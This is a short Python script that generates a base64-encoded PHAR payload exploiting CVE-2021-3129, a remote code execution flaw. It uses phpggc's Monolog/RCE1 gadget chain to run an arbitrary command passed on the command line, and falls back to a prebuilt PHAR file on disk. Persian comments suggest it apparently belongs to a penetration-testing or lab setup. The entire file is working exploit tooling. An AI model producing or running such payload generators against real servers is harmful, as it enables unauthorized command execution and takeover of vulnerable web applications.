#!/usr/bin/env python3
"""Generate base64-encoded PHAR payload for CVE-2021-3129 that runs a command."""
import sys, base64, subprocess

def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
    # روش ۱: استفاده از phpggc
    try:
        phar = subprocess.check_output(
            ["phpggc", "-f", "-b", "Monolog/RCE1", "system", cmd],
            stderr=subprocess.DEVNULL,
        ).decode().strip()
        print(phar, end="")
        return
    except (subprocess.CalledProcessError, FileNotFoundError):
        pass
    # روش ۲: PHAR آماده‌ی هاردکد که با $argv[1] ساخته شده — دامنه‌ی کار تو
    print(base64.b64encode(open("/opt/aegis/fallback.phar", "rb").read()).decode(), end="")

if __name__ == "__main__":
    main()